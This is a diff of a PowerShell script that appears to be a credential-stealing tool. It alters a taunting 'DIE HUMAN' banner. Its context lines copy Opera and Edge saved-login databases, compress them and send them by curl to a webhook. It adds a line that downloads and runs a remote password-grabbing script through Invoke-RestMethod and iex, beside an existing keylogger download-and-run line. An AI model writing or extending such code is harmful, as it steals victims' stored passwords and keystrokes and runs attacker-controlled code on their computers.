@@ -222,28 +222,7 @@ foreach ($dir in $matchingDirectories) {
 
 $infomessage = "
 ==================================================================================================================================
-   
-          .                                                      .
-        .n                   .                 .                  n.
-  .   .dP                  dP                   9b                 9b.    .
- 4    qXb         .       dX                     Xb       .        dXp     t
-dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
-9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
- 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
-  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
-    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
-        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
-                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
-                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
-                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
-                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
-                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
-                     `'      9XXXXXX(   )XXXXXXP      `'
-                              XXXX X.`v'.X XXXX
-                              XP^X'`b   d'`X^XX
-                              X. 9  `   '  P )X
-                              `b  `       '  d'
-                               `             '
+                              `             '
                    Y̸̢̬̘͇̯̌̅͑̽̀̅o̵̭̥̘̺̼̺͑̐̔̾̄́u̶̢̹̙͔̟͝ ̴̫͍̲̤̳͗͐̒̈́̔̀͂ḣ̶̭̼͈̙̬̬̖̮̂̄̉ȃ̶̹̖̮͙̌̓͋͆̉v̵̯̖͚̙͍̣͒̐ẹ̸̛̤̯̍͗͐̇ ̷̱͛̌́̋̌̆͘̚f̴̛̬̯̠̞̼͍͙̽̉͝͠a̸̯͆̾̌̓͗͂̅̒l̷̨̤̜̺̣̣͗͌͊̇͝ͅl̶̘͙̪̱̙̟̝̆̀͂͒̍e̸̢͉͉͗̾̀͂͒̈́̓n̶̛̖̳͔͚͍̽̈́̐͜ ̸̛̣͖̰̦̼̤̀̂̾̚̚i̵̘͔̅̿n̷̻͌͗̔̎̑͆ ̵̱̹̄ţ̷͎̪̓̃̎͋̃̈́̉͘h̴͖̘̳̙̱̘̍͛̅̇e̵̮̱̥̹͚̒̌ͅ ̷̬͖͍̥̪̀ͅg̶̛̝̳͛̃a̸͙̣̮͍̅͋̍͊̎̾̔͠s̵̡̆͌̔͜p̸͚͓͓͔̔̊͌ ̵̡̪͈̼̳͗̓̐̓͗͒o̴̫̮̠̅̈̄͐̍̕͝f̶͉͎̗͍̣̈́͊̿͐͝ ̵̼͚̂K̸̨͎̼̰̜̩͗̀̊͗͛̆Ȃ̵̖̈́̿̊͊͝͠H̷̺̞̭͌̏̌̎͜
 ==================================================================================================================================
 "
@@ -366,6 +345,8 @@ if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item 
 if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$outpath\B1555.005Edge_Login Data"} else {} 
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
+# Grab pass browserpassview
+Invoke-RestMethod irm https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
 # keylogchrome
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 Sleep 10
